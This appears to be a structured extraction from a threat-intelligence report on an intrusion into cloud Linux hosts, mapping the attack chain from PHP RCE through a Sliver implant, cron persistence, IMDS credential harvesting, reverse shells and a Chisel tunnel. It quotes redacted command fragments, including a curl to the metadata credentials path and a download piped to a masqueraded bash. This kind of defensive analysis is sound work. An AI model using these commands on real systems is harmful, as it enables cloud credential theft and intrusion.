techniques.evidence_quote: The adversary achieved Remote Code Execution (RCE) on multiple Linux hosts following the exploitation of vulnerable public facing PHP applications.
The adversary created a cron job to download and run the Silver implant upon reboot.
Various discovery commands were executed such as whoami.ps.uname.id in addition to reaching out to an external domain to IP address information.
Additional discovery operations were observed which included querying the instance metadata service API to enumerate Identity and Access Management roles.
The adversary performed various discovery techniques, collecting information on network connections, running processes and system users.

techniques.technique_name: Unsecured Credentials: Cloud Instance Metadata API
techniques.evidence_quote: The adversary attempted to harvest the cloud credentials via the Instance metadata service API. curl -k http://[REDACTED IP Address]/latest/meta-data/iam/security-credentials/[REDACTED IAM Role]
The adversary leveraged the cloud provider's orchestration tool in an attempt to execute python reverse shells.
Curl was used in an attempt to download a Sliver implant.
Activity included attempted harvesting of cloud instance credentials and the use of Chisel to attempt protocol tunneling using an external SOCKS proxy.
Utilizing the established Chisel tunnel, the adversary attempted to connect to various endpoints across ports indicating interest in SSH, RDP, SQLServer and MySQL services.
Utilizing the established Chisel tunnel, the adversary attempted to connect to various endpoints across ports indicating interest in SSH, RDP, SQLServer and MySQL services.

attack_chain.description: Unknown adversary exploited vulnerable public-facing PHP applications on multiple Linux cloud hosts to achieve Remote Code Execution (RCE).
attack_chain.evidence_quote: The adversary achieved Remote Code Execution (RCE) on multiple Linux hosts following the exploitation of vulnerable public facing PHP applications.

attack_chain.description: The adversary created a cron job to persist by downloading and executing the Sliver implant upon every reboot, masquerading the process as a legitimate kernel thread.
attack_chain.evidence_quote: The adversary created a cron job to download and run the Silver implant upon reboot. curl hxxp://[REDACTED]... bash -c "exec -a '[kthread/4:3-bus]'"

attack_chain.description: The adversary ran host reconnaissance commands (whoami, ps, uname, id) and reached out to external domains for IP address information.
attack_chain.evidence_quote: Various discovery commands were executed such as whoami.ps.uname.id in addition to reaching out to an external domain to IP address information.

attack_chain.description: The adversary queried the cloud provider's Instance Metadata Service (IMDS) API to enumerate IAM roles available on the compromised host.
attack_chain.evidence_quote: Additional discovery operations were observed which included querying the instance metadata service API to enumerate Identity and Access Management roles.

attack_chain.technique_name: Unsecured Credentials: Cloud Instance Metadata API
attack_chain.description: The adversary used curl to harvest cloud IAM credentials via the Instance Metadata Service API endpoint.
attack_chain.evidence_quote: The adversary attempted to harvest the cloud credentials via the Instance metadata service API. curl -k http://[REDACTED IP Address]/latest/meta-data/iam/security-credentials/[REDACTED IAM Role]

attack_chain.description: The adversary used curl to download the Sliver implant from a remote attacker-controlled server into /dev/shm/ to avoid on-disk detection.
attack_chain.evidence_quote: Curl was used in an attempt to download a Sliver implant.

attack_chain.description: The adversary leveraged the cloud orchestration tool to attempt to execute Python reverse shells connecting back to attacker-controlled infrastructure.
attack_chain.evidence_quote: The adversary leveraged the cloud provider's orchestration tool in an attempt to execute python reverse shells.

attack_chain.description: The adversary executed a compiled Chisel tool to establish a reverse SOCKS proxy tunnel between the compromised cloud-hosted server and attacker infrastructure.
attack_chain.evidence_quote: The adversary executed a customer compiled version of the Chisel protocol tunneling tool to establish a reverse tunnel between the endpoint and adversary infrastructure.

attack_chain.description: Utilizing the Chisel tunnel, the adversary attempted lateral movement to multiple internal endpoints via SSH, RDP, SQL Server and MySQL ports.
attack_chain.evidence_quote: Utilizing the established Chisel tunnel, the adversary attempted to connect to various endpoints across ports indicating interest in SSH, RDP, SQLServer and MySQL services.

initial_access_vector: Exploitation of vulnerable public-facing PHP web applications on Linux cloud hosts resulting in Remote Code Execution (RCE)
persistence_mechanism: Cron job created to download and execute Sliver implant on reboot, stored in /dev/shm/ and masqueraded as kernel thread '[kthread/4:3-bus]'
privilege_escalation: Attempted credential harvesting via IMDS API to obtain IAM role credentials with potentially elevated cloud permissions
